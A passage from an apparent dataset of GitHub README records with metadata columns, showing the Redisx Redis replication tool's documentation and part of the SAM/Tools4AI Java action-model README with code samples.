",0,0,1,3.0,"['the', 'one', 'billion', 'row', 'challenge', 'about', 'challenge', 'result', 'result', 'm', 'implementation', 'submitter', 'note', 'prerequisite', 'run', 'challenge', 'rule', 'limit', 'enter', 'challenge', 'evaluate', 'result', 'prize', 'faq', 'license', 'code', 'conduct']","['challenge', 'result', 'the', 'one', 'billion']",1.0,"[com.mycila:license-maven-plugin,net.revelc.code.formatter:formatter-maven-plugin,net.revelc.code:impsort-maven-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.apache.maven.plugins:maven-wrapper-plugin]",0.0,1.0,0.0
970263611/redisx,main,"

## Redis stream replication tool Redisx

[![996.icu](https://img.shields.io/badge/link-996.icu-red.svg)](https://996.icu) 

English | [ä¸­æ–‡](https://github.com/970263611/redisx/blob/main/README-CN.md)

### Introduction to Redisx

Redis supports the From side single machine/sentinel'cluster mode, and the To sidesingle machine sentinel cluster mode can be freely combinedã€‚

- Supports Redis version2.8 and above
- Support high availability cluster deployment and vertical scaling
- Support full synchronization of RDB data and incremental synchronization of data
- Support for continued transmission
- Supports the five basic types of Redis + stream
- Support From and To dual end data queries, with the ability to reconnect in case of downtime
- Support timed exit for one-time synchronization

![redis-x-English](images/redis-x-English.png)

On a computer with a CPU of 13600KF and DDR5 64G memory (32G dual channel), 3 hosts and 3 slaves were set up in two Redis clusters. The boosting tool (30 concurrent) and Redis were run simultaneously. In the absence of a specific boot memory size, no server startup, and a JDK of 1.8 in Redis, the test results are as follows:

â€‹                                             **Test the data transmission rate of Redisx**

![redisx5w-English](images/redisx5w-English.jpg)

### Author

Dahua team (see GitHub submitter for details),please pay attention to [material project](https://github.com/970263611/redisx-material) for Redis related materials.

### Definition

Redisx:The name of the stream replication tool.

From:The collective name of Redis end nodes for data sources.

To:The collective name of Redis end nodes for data storage.

### The startup environment 

Jdk1.8+

### Quick start

- Specify the configuration file method

  ```shell
  java -jar redisx.jar redisx.yml
  ```

- Use default configuration file method

  ```shell
  java -jar redisx.jar
  ```

redisx.yml Quick Start Configuration Example

```yaml
redisx:
  from:
    redis:
      version: 6.0.9  #Redis version
    password: 1a.2b*  #Redis password
    mode: cluster     #Redis mode,single sentinel cluster
    address:          #From Data source address, such as cluster or sentinel mode, can be configured with a single node
      - 127.0.0.1:6379
  to:
    password: 1a.2b*  #Redis password
    mode: cluster     #Redis mode,single sentinel cluster
    address:          #To Data source address, such as cluster or sentinel mode, can be configured with a single node
      - 127.0.0.1:6380
```

Redisx At startup, it supports passing parameters in the environment variable mode, which has higher priority than the configuration file mode

```shell
-Dredisx.from.password=1a.2b* -Dredisx.to.password=2b*1a.
```

### Availability

Redisx supports multi node primary and backup deployment.When multiple nodes start simultaneously and the switch flag (redisx. switchFlag)configuration is the same, it will automatically form a one master, multi slave primaryand backup mode. When the primary node is abnormal, the backup node willautomatically become the primary node, continue data synchronization work. and canresume transmission with breakpoints to ensure data integrity and continuity. At thispoint, the abnormal node will automatically downgrade after recovery.

#### Vertical Scaling

When there is a large amount of data in Redis cluster mode on the From side duringvertical expansion, there may be a delay in synchronizing the entire amount of datawith a Redis node. Therefore, Redis supports split synchronization, which can beconfigured to enable the Redis service to selectively synchronize certain From clusternodes. By starting different Redis nodes multiple times, synchronization can becovered to all From cluster nodes, greatly improving synchronization efficiency.

<img src=""images/highuse-English.png"" alt=""highuse-English"" style=""zoom:150%;"" />

#### Self-healing


The status of Redis nodes will not affect the operation of Redisx services. When Redis nodes experience abnormal phenomena such as service downtime or master node drift, Redisx can automatically select normal nodes and start/stop data synchronization work without worrying about the status of Redis nodes on the From/To side, which may affect Redis.

### Data writing mode

##### Default Mode

The default mode is to submit offset data at a frequency of once per second, with 50 data per 100milliseconds submitted to the To cluster. This mode has a high throughput and ismutually exclusive with the Strong Consistency mode.

##### Strong consistency mode

 After each data 1s written to the To cluster, it is forciblysynchronized with an offset. This mode has high stability and is mutually exclusivewith the default mode.

##### The forced full synchronization data mode

The forced full synchronization data mode forces full synchronization of all data information from the master/slave every time it is started. There may be a small initial delay in large data volumes, but data idempotency can be guaranteed. This mode is not mutually exclusive with other modes.

### Service Monitoring

The Redisx page monitoring function can display the real-time working status of Redis and Redisx nodes, Redisx's data synchronization speed, data accumulation, and configuration information. At the same time, we are gradually improving the alarm function of Redisx.

![](images/monitor.png)

##### Data query capability

Note: Production startup is not recommended, and port access is not recommended

```shell
http://${ip}:${port}/console?command=${command}&type=from/to   
#'command' is a specific instruction, 'type' is To query Redis data From the source, and To query Redis data From the source
For exampleï¼š
http://localhost:9999/console?command=get testKey&type=from
http://localhost:9999/console?command=get testKey&type=to
```

### Configuration information

#### Full configuration

```yaml
redisx:
  from:
    redis:
      #(Required field) From Redis version, it is recommended that this version should not be higher than the to version to prevent synchronization issues caused by Redis instruction incompatibility
      version: 6.0.9
    #Redis password From the end.The passwords for data nodes and sentinel nodes should be consistent in sentinel mode.
    password: 1a.2b*
    #(Required field)From Redis mode, single sentinel cluster
    mode: cluster
    #(redis.from.mode is mandatory when sent as sentinel)mastername of the master node in sentinel mode
    masterName: myMaster
    #(Required field)From Redis node address, configurable for single or multiple node addresses
    address:
      - 127.0.0.1:16001
    #Whether to enable vertical expansion, default value is false
    verticalScaling: false
    #Whether to force connection to the main node, default value is false
    connectMaster: false
  to:
    #To end Redis password
    password: 2b*1a.
    #(Required field)To Redis mode, single sentinel cluster
    mode: cluster
    #(Required when redis.to.mode is sentinel) mastername of the master node in sentinel mode
    masterName: myMaster
    #(Required field)To end Redis node address, configurable for single or multiple node addresses
    address:
      - 127.0.0.2:16101
    #Whether to clear the data on the To end at startup (this configuration will take effect every time redisx.for.alwaysFullSync is true), default value is false
    flushDb: false
    #To end single write data threshold, default value is 50
    flushSize: 50
  console:
    #Whether to enable console, default value is true
    enable: true
    #Whether to enable bidirectional data query function on the console, default value is false
    search: false
    #Console response timeout (milliseconds), default value 5000
    timeout: 5000
    #Console publishing port, default value 15967
    port: 15967
  #Strong consistency mode, in which a single piece of data will only undergo offset updates after completing IO
  #Enabling it can reduce data inconsistency caused by service exceptions, but it will significantly decrease synchronization efficiency
  immediate:
    #Whether to enable strong consistency mode, default value is false
    enable: false
    #Write failure retry times in strong consistency mode, default value 1
    resendTimes: 1
  #Is the global mandatory full synchronization data mode
  #After activation, full synchronization will be performed every time synchronization is restarted, without continuing synchronization
  #After activation, syncRdb configuration is forced to true
  #Default value false
  alwaysFullSync: false
  #Redisx master-slave switching flag
  switchFlag: REDISX-AUTHOR:DAHUA&CHANGDONGLIANG&ZHANGHUIHAO&ZHANGSHUHAN&ZHANGYING&CHENYU&MAMING
  #Whether to synchronize stock data, default value is true
  syncRdb: true
  #Timed exit
  timedExit:
    #Whether to enable timed exit, default value is false
    enable: false
    #Do not execute the close hook function
    #Effective at [timedExit. enable=true], default value is false
    force: false
    #Timing duration, unit: seconds. If it is less than 0 and the only synchronized rdb function is not enabled, the timed exit function will be invalid
    #Effective at [timedExit. enable=true], default value -1
    duration: -1
    #Only synchronize rdb. When [enable=true] and this configuration are set simultaneously, both will take effect simultaneously. When one of them triggers, the program will exit
    #When this configuration takes effect, the [timedExit. force] configuration is forced to false
    #Effective at [timedExit. enable=true], default value is false
    onlyRdb: false
  #Data filtering, can choose to match synchronization or match asynchronous
  filter:
    #Whether to enable data filtering, default false
    enable: false
    #Data encoding format, default utf-8
    charset: utf-8
    #needful:Synchronize data matched by rules; needless:The data matched by the rules is not synchronized
    type: needful
    #Match rule regular expression, configurable multiple, default [\s\S]*
    rules:
      - '[\s\S]*'
#The configuration file supports enc encryption, and the encrypted configuration requires the use of 'ENC (configuration content)' package
jasypt:
  encryptor:
    password: KU1aBcAit9x
    algorithm: PBEWithMD5AndDES
    ivGeneratorClassName: org.jasypt.iv.NoIvGenerator
logging:
  level:
    #Global log level
    global: info
```

#### Recommended scene configuration

The data volume difference in the following data difference description refers to the problem of inconsistent keys (more From, less To) and inconsistent values (duplicate List data content) in the data

##### Data Strong Consistent Synchronization Scenario

```yaml
redisx:
  from:
    redis:
      version: x.x.x
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
    alwaysFullSync: true
  to:
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
    flushDb: true #When redisx.for.alwaysFullSync is true, this configuration will take effect every time it synchronizes
```

Function Description

1.Strong consistency of data, strict requirement for From and To end data to be completely consistent

2.Priority is given to connecting From nodes on the From end, and there is no way to select the master

3.No longer interrupt the continuation, perform full synchronization every time

No data difference

**Note **:This mode will clear the To data and resynchronize the From data in every abnormal scenario. There may be short-term data inconsistency on the To side, and full data synchronization requires bandwidth resources. If there is a unique key on the To end, this mode cannot be used, and after stopping the From end during disaster recovery switching, the Redisx service also needs to be stopped

##### Scenario of synchronizing large amounts of data

```yaml
redisx:
  from:
    redis:
      version: x.x.x
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  to:
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
```

Function Description

1.Efficient synchronization, batch submission, data submission and offset refresh for a single To node every 50 pieces of data or with a maximum interval of 100 milliseconds

2.Priority is given to connecting From nodes on the From end, and there is no way to select the master

3.Interrupt synchronization when Redis service is abnormal, and automatically start synchronization when Redis service is normal

4.Support synchronization of existing RDB data and support interruption and continuation of transmission

Data discrepancy description (may only occur in abnormal situations)

1.Any node on the From end fails or Redis is shut down normally (kill), with no data difference

2.A single To end master node failure may result in a data difference of no more than the product of the To quantity and redisx.to.flushSize

3.Redisx may experience a data difference of no more than the product of the number of To end master nodes and redisx.to.flushSize by forcing an interrupt (kill -9)

##### The data volume is small, but there is a high requirement for consistency

```yaml
redisx:
  from:
    redis:
      version: x.x.x
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  to:
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  immediate:
    enable: true
```

Function Description

1.Low efficiency, single submission, single To node performs data submission and I/O operation result confirmation for every 1 data, offset refresh and result confirmation

2.Priority is given to connecting From nodes on the From end, and there is no way to select the master

3.Interrupt synchronization when Redis service is abnormal, and automatically start synchronization when Redis service is normal

4.Support synchronization of existing RDB data and support interruption and continuation of transmission

Data discrepancy description (may only occur in abnormal situations)

1.Any node on the From end fails or Redis is shut down normally (kill), with no data difference

2.A single To end master node failure may result in a difference in data volume not exceeding the number of To end Redis master nodes

3.Redis may experience a data volume difference of no more than the number of Redis master nodes on the To side through forced interrupts (kill -9)

##### Cluster mode, with a huge amount of data, requires extremely high synchronization efficiency

Group: Refers to a collection of nodes with the same redisx.switchFlag configuration

Redisx Group1ï¼š

```yaml
redisx:
  from:
    redis:
      version: x.x.x
    mode: cluster
    password: 1a.2b*
    address:
      - From node1
      ...
    verticalScaling: true
  to:
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  switchFlag: REDISX-...Each group of Redisx services must be inconsistent, and the primary and backup Redisx services within the same group must be consistent
```

Redisx Group2:

```yaml
redisx:
  from:
    redis:
      version: x.x.x
    mode: cluster
    password: 1a.2b*
    address:
      - From node2
      ...
    verticalScaling: true
  to:
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  switchFlag: REDISX-...Each group of Redisx services must be inconsistent, and the primary and backup Redisx services within the same group must be consistent
```

Function Description

1.Only synchronize the From node data in the configuration, without extending to the entire From cluster data

2.Select only configuration nodes From the end

3.Interrupt synchronization when Redis service is abnormal, and automatically start synchronization when Redis service is normal

4.Support synchronization of existing RDB data and support interruption and continuation of transmission

Data discrepancy description (may only occur in abnormal situations)

1.Any node on the From end fails or Redis is shut down normally (kill), with no data difference

2.A single To end master node failure may result in a difference in data volume not exceeding the number of To end Redis master nodes

3.Redis may experience a data volume difference of no more than the number of Redis master nodes on the To side through forced interrupts (kill -9)

##### One time synchronization/Timed synchronization

```yaml
redisx:
  from:
    redis:
      version: x.x.x
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  to:
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  timedExit:
    enable: true
    force: true  #Whether to enable interrupt compensation and whether the accumulated data in the queue is fully synchronized during the interrupt;Default false
    duration: 1000   #How long does it close, in seconds
```

Function Description

1.The synchronization efficiency is the same as the regular mode or strong consistency mode, and it will automatically shut down after the set running time

2.Priority is given to connecting From nodes on the From end, and there is no way to select the master

3.Interrupt synchronization when Redis service is abnormal, and automatically start synchronization when Redis service is normal

4.Support synchronization of existing RDB data

No data difference

#### Other configurations

##### Configure encryption

Function Description

Password encryption, supports jasypt password encryption and decryption operations, encryption configuration is placed in ENC (...) parentheses

configuration information

```yaml
redisx:
  from:
    password: ENC(...)
jasypt:
  encryptor:
    password: U8eT6mld1
    algorithm: PBEWithMD5AndDES
    ivGeneratorClassName: org.jasypt.iv.NoIvGenerator
```

##### To end data cleaning

Function Description

Clean up To data during global initial startup, suitable for cleaning dirty data on the To side

configuration information

```yaml
redisx:
  to:
    flushDb: true #Default false
```

##### Every full synchronization

Function Description

No longer interrupt the continuation, perform full synchronization every time. Strong data integrity, suitable for scenarios that require complete data

configuration information

```yaml
redisx:
  alwaysFullSync: true #Default false
```

##### Incremental synchronization only

Function Description

No longer synchronizing existing RDB data, only synchronizing incremental data generated after the launch of the Redisx service; If only full synchronization is enabled, this configuration becomes invalid.

configuration information

```yaml
redisx:
  syncRdb: false #Default true
```

[![LICENSE](https://img.shields.io/badge/license-Anti%20996-blue.svg)](https://github.com/996icu/996.ICU/blob/master/LICENSE)
",3,1,6,12.0,"['redis', 'stream', 'replication', 'tool', 'redisx', 'introduction', 'redisx', 'author', 'definition', 'the', 'startup', 'environment', 'quick', 'start', 'availability', 'vertical', 'scaling', 'data', 'writing', 'mode', 'default', 'mode', 'strong', 'consistency', 'mode', 'the', 'force', 'full', 'synchronization', 'data', 'mode', 'service', 'monitoring', 'data', 'query', 'capability', 'configuration', 'information', 'full', 'configuration', 'recommend', 'scene', 'configuration', 'data', 'strong', 'consistent', 'synchronization', 'scenario', 'scenario', 'synchronize', 'large', 'amount', 'data', 'the', 'data', 'volume', 'small', 'high', 'requirement', 'consistency', 'cluster', 'mode', 'huge', 'amount', 'data', 'require', 'extremely', 'high', 'synchronization', 'efficiency', 'one', 'time', 'synchronization', 'other', 'configuration', 'configure', 'encryption', 'to', 'end', 'data', 'clean', 'every', 'full', 'synchronization', 'incremental', 'synchronization']","['data', 'synchronization', 'mode', 'configuration', 'the']",1.0,[org.apache.maven.plugins:maven-assembly-plugin],0.0,1.0,0.0
vishalmysore/sam,main,"<div align=""center"">
  <a href=""https://www.linkedin.com/posts/vishalrow_ai-appdevelopment-actions-activity-7171302152101900288-64qg?utm_source=share&utm_medium=member_desktop"">
    <img src=""tools4ai.png""  width=""300"" height=""300"">
  </a>
</div>
<p align=""center"">
    <img  src=""https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fvishalmysore%2Ftools4ai&countColor=black&style=flat%22"">
    <a target=""_blank"" href=""https://github.com/vishalmyore/tools4ai""><img src=""https://img.shields.io/github/stars/vishalmysore/tools4ai?color=black"" /></a>
    <a target=""_blank"" href=""https://github.com/vishalmysore/sam/actions/workflows/maven.yml""><img src=""https://github.com/vishalmysore/sam/actions/workflows/maven.yml/badge.svg"" /></a>  
</p>

# ğŸ¬ Simple Action Model - SAM

SAM is a reference implementation of Tool4AI project  https://github.com/vishalmysore/Tools4AI
Basically showcasing how straight forward it is to build action oriented applications in 100% Java. In addition to action model
SAM can be used as an autonomous agent by utilizing action scripts which are a specialized form of these intelligent systems, designed specifically for enterprise AI 
applications. While retaining the core capabilities of autonomy and adaptability, scripts can operates within
a controlled framework, executing tasks and making decisions that align with predefined business rules and 
objectives 

## Features and Articles
- **Action Processor**: Execute actions based on prompt (OpenAI, Gemini, Anthropic) [here](https://www.linkedin.com/pulse/large-action-model-gemini-java-vishal-mysore-qki8c?trackingId=MuqKH2YZNwe74wisqhMSuw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Image Processor**: Trigger actions based on images [here](https://www.linkedin.com/pulse/image-recognition-function-calling-gemini-java-vishal-mysore-sz5zc?trackingId=lpJITsmYD0XPgdaG676jmA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Autonomous Agent**: Execute tasks based on scripts [here](https://www.linkedin.com/pulse/enterprise-ai-hub-llm-agent-built-openai-java-vishal-mysore-0p7oc?trackingId=qE91gQ%2Bngtn4vI45pxJEgg%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Image to Text**: Convert images to text[here](https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc?trackingId=8N9y2fCuYRDzmju9dREwVw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Image to Pojo**: Convert images to Pojo [here](https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc?trackingId=8N9y2fCuYRDzmju9dREwVw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Image to Json**: Convert images to Json [here](https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc?trackingId=8N9y2fCuYRDzmju9dREwVw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Image to XML**: Convert images to XML[here](https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc?trackingId=8N9y2fCuYRDzmju9dREwVw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Selenium Actions**: Execute actions based on Selenium script [here](https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc/?trackingId=r0XIS0PtQZWrCqbgZwLbww%3D%3D)
- **Spring Integration**: Integrate with Spring Boot [here](https://www.linkedin.com/pulse/spring-action-integrating-ai-applications-vishal-mysore-ogjkc?trackingId=qsUWss8mwUVYSijqTD1SRA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Script Processor**: Execute tasks based on scripts [here](https://www.linkedin.com/pulse/action-all-you-need-moving-beyond-conversation-ai-vishal-mysore-sukfc?trackingId=XieWREfuTm3Lsb4uZkpAdw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Http Actions**: Execute actions based on HTTP requests [here](https://www.linkedin.com/pulse/http-endpoints-large-action-model-complete-ai-vishal-mysore-vhhmc?trackingId=Lht%2FqIlOATU5k3j8pznjKA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Prompt Processor**: Execute tasks based on prompts [here](https://www.linkedin.com/pulse/advanced-prompt-processing-java-parallel-data-more-vishal-mysore-7gtoc?trackingId=VNYgjVXcGDpkWkLNz0JPow%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Prompt Transformer**: Convert prompts into various formats ( Java , Json , XML) [here](https://www.linkedin.com/pulse/sam-simple-action-model-java-vishal-mysore-nmwec?trackingId=wFNZtf8A30JnMvWUjJhfiA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Custom GSON**: Convert special values in prompts [here](https://www.linkedin.com/pulse/large-action-model-gemini-java-vishal-mysore-qki8c?trackingId=MuqKH2YZNwe74wisqhMSuw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Subprompt Processing**: Break prompts into multiple subprompts [here](https://www.linkedin.com/pulse/building-autonomous-ai-agent-java-action-scripts-vishal-mysore-p3mbf?trackingId=Y6X67pUWoycIGQHaYexn9w%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Human In Loop Validation** [here](https://www.linkedin.com/pulse/ai-development-java-gemini-vishal-mysore-7puqc?trackingId=VUqUIPcf%2BLLOR5z1kOYWwA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Explainablity** [here](https://www.linkedin.com/pulse/enhancing-ai-decision-making-multi-ai-voting-mechanism-vishal-mysore-qlpxc?trackingId=NQ4m7eoWn97yJ50C7iBcMw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Kubernets Integration** [here]( [here](https://www.linkedin.com/pulse/kubernetes-management-ai-using-tools4ai-vishal-mysore-d4jxc?trackingId=sBUyZg%2BykR9dTx%2FTwineiQ%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Multi Command Processor** [here](https://www.linkedin.com/pulse/enterprise-ai-hub-llm-agent-built-openai-java-vishal-mysore-0p7oc?trackingId=074SlSqIoJkEJFEkOC98QA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3B68UQVWs4SiW1kIcA14PsKg%3D%3D)
- **Hallucination Detector** [here](https://www.linkedin.com/pulse/detect-ai-hallucinations-rag-routing-branching-chaining-vishal-mysore-jrzic)
- **Bias Detector** [here](https://www.linkedin.com/pulse/ai-bias-what-does-mean-vishal-mysore-0atsc)
- **Database Actions**
- **Tibco Actions**
- **Custom Actions**
- **Custom HTTP Actions**
- **Custom Shell Actions**
- **Custom Swagger Actions**
- **Custom OpenAI Actions**
- **Custom Selenium Actions**
- 

## Setup
Clone this project and then  

```mvn clean install```

## Action Processor
Action Processors are responsible for taking actions based on prompt. Actions can be written in Java Methods, Or could be 
HTTP rest end points , could be Shell scripts or could be loaded directly from the Swagger HTTP configurations.
Inside ```Main.java``` these 2 lines will predict the action and execute it using Gemini , you dont have to worry
about specifying the action, the action will be picked up based on Natural Language Processing semantic mapping
and will be executed. 

```
String cookPromptSingleText = ""My friends name is Vishal ,"" +
                ""I dont know what to cook for him today."";
GeminiActionProcessor processor = new GeminiActionProcessor();
String result = (String)processor.processSingleAction(cookPromptSingleText);
log.info(result);
```

This code will use OpenAI to predict the action and execute it 

```
OpenAiActionProcessor opeAIprocessor = new OpenAiActionProcessor();
Sring result = (String)opeAIprocessor.processSingleAction('My friends name is Vishal ,he lives in tornto.I want save this info locally');
System.out.println(result);

```

Create custom action by using @Predict annotation and @Action annotation. Parameters of the method can be 
anything and any number of parameters are allowed You need to make sure parameters have meaningful name. 

```
@Predict
public class SimpleAction {

    @Action(description = ""Provide persons name and then find out what does that person like"")
    public String whatFoodDoesThisPersonLike(String name) {
        if(""vishal"".equalsIgnoreCase(name))
        return ""Paneer Butter Masala"";
        else if (""vinod"".equalsIgnoreCase(name)) {
            return ""aloo kofta"";
        }else
            return ""something yummy"";
    }

}
```
or
```
@Log
@Predict
public class SearchAction  {

    @Action(description = ""Search the web for information"")
    public String googleSearch(String searchString, boolean isNews)  {
        log.info(searchString+"" : ""+isNews);
        HttpResponse<String> response = Unirest.post(""https://google.serper.dev/search"")
                .header(""X-API-KEY"", PredictionLoader.getInstance().getSerperKey())
                .header(""Content-Type"", ""application/json"")
                .body(""{\""q\"":\""""+searchString+""\""}"")
                .asString();
        String resStr = response.getBody().toString();
        return resStr;
    }




}
```

Or add actions in Shell or HTTP config files  

## Image Processing and Actions
Trigger actions based directly on images! Yes, you read that right â€“ with the power of Java, we can now integrate function calling with image inputs.

Imagine a system so advanced that it can:

ğŸš‘ Call an ambulance immediately after detecting an image of a car accident.  
ğŸ³ Suggest recipes the moment it sees images of vegetables.  
ğŸ‘® Alert the police when it captures an image of a traffic signal violation.  
ğŸš’ Contacts the fire department immediately if it ""sees"" fire.  


```
public class ImageActionExample {
public static void main(String[] args) throws AIProcessingException {
GeminiImageActionProcessor processor = new GeminiImageActionProcessor();
String imageDisription = processor.imageToText(args[0]);
GeminiV2ActionProcessor actionProcessor = new GeminiV2ActionProcessor();
Object obj = actionProcessor.processSingleAction(imageDisription);
String str  = actionProcessor.summarize(imageDisription+obj.toString());
System.out.println(str);
}
}
```


## Autonomous Agent (Action Script)

If you have a complete script written in English , ScriptProcessor will process the script and provide consolidated results

```
 ScriptProcessor script = new ScriptProcessor();
 ScriptResult result =  script.process(""complexTest.action"");
 String resultsString = script.summarize(result)
 log.info(resultsString)

```

Sample script is here 

``` 
can you reserve the flight for Vishal from Toronto to Bangalore for 3 Days on 7th december
If flight booking is successful, can you reserve the car for Vishal from Bangalore to Toronto for 10 Days on 17th december
if car booking is successful and flight cost are less than $1000 then book the sight seeing attraction called 5 star palace
if car booking is successful and flight cost are more than $1000 then book the sight seeing attraction called peanut palace
```

You can add Human In Loop validation , Explainablity , Multi Command Processor, Hallucination Detector , Bias Detector , Database and Tibco actions as well
please look at https://github.com/vishalmysore/Tools4AI for more information

## Prompt Transformer

Prompt Transformer, a core feature in the Tools4AI project, simplifies data transformation tasks. It effortlessly converts prompts into various formats like Java POJOs, JSON strings, CSV files, and XML. By enabling direct conversion of prompts into domain-specific objects, Prompt Transformer streamlines data processing tasks. It offers flexibility and ease of use for transforming data structures to meet diverse needs in modern applications.

### Convert Prompt to Simple Pojo

Lets take the first scenario where you want to conver the prompt directly into Java Bean or Pojo

```  
PromptTransformer builder = new PromptTransformer();
String promptTxt =""Sachin Tendulkar is very good cricket player, "" +
                           ""he joined the sports on 24032022, he has played 300 matches "" +
                           ""and his max score is 400"";
//Convert the prompt to Pojo
Player player = (Player)builder.transformIntoPojo(promptTxt, Player.class.getName(),""Player"",""create player pojo"");
log.info(player.toString());
```

The above will convert the prompt into this simple Pojo 
```
import lombok.*;
import lombok.extern.java.Log;

import java.util.Date;

@NoArgsConstructor
@AllArgsConstructor
@Getter
@Setter
@EqualsAndHashCode
@ToString
public class Player {
     int matches;
     int maxScore;
     String firstName;
     String lastName;
     Date dateJoined;


}
 
```
### Convert Prompt to Complex Pojo

The transformer can also convert into complex Pojo ( where there are multiple objects inside the Pojo)

```
PromptTransformer builder = new PromptTransformer();
promptTxt = ""can you book Maharaja restaurant in "" +
            ""Toronto for 4 people on 12th may , I am Vishal "";
//Convert the prompt to Complex Pojo
RestaurantPojo pojo = (RestaurantPojo)builder.transformIntoPojo(promptTxt, RestaurantPojo.class.getName(),""RestaurantPojo"",""Build the pojo for restaurant"");
log.info(pojo.toString()); 
```

This will create the Pojo Object of RestaurantPojo and also populate the internal objects ( not just primitive)
```
public class RestaurantPojo {
    String name;
    int numberOfPeople;
    //Pojo inside Pojo    
    RestaurantDetails restaurantDetails;
    boolean cancel;
    String reserveDate; 
```
### Convert Prompt with Custom GSON

If you expect some custom objects like Date etc in the prompt you can have custom Gson Builder

```
//Using Custom GSON to convert special values
GsonBuilder gsonBuilder = new GsonBuilder();
gsonBuilder.registerTypeAdapter(Date.class, new DateDeserializer(""dd MMMM yyyy""));
Gson gson = gsonBuilder.create();
PromptTransformer customBuilder = new PromptTransformer(gson);
String prompt = ""Sachin Tendulkar is very good cricket player, he joined the sports on 12 May 2008,"" +
                ""he has played 300 matches and his max score is 400"";
player = (Player)customBuilder.transformIntoPojo(prompt, Player.class.getName(),""Player"",""create player pojo"");
log.info(player.toString()); 
```
This will use Custom Date Serializer 

```
public class DateDeserializer implements JsonDeserializer<Date> {
    private final DateFormat dateFormat;

    public DateDeserializer(String format) {
        this.dateFormat = new SimpleDateFormat(format, Locale.ENGLISH);
    }

    @Override
    public Date deserialize(JsonElement json, Type typeOfT, JsonDeserializationContext context) throws JsonParseException {
        try {
            return dateFormat.parse(json.getAsString().replaceAll(""(st|nd|rd|th),"", "",""));
        } catch (ParseException e) {
            throw new JsonParseException(e);
        }
    }
} 
```

### Convert Prompt to Json String
If you want to convert the Prompt into the Json String 
``` 
 prompt = ""Sachin Tendulkar is very good cricket player, he joined the sports on 12 May 2008,"" +
                ""he has played 300 matches and his max score is 400"";
 //Extract Json from the prompt
 String jsonString = ""{\""lastName\"":\""String\"",\""firstName\"":\""String\""}"";
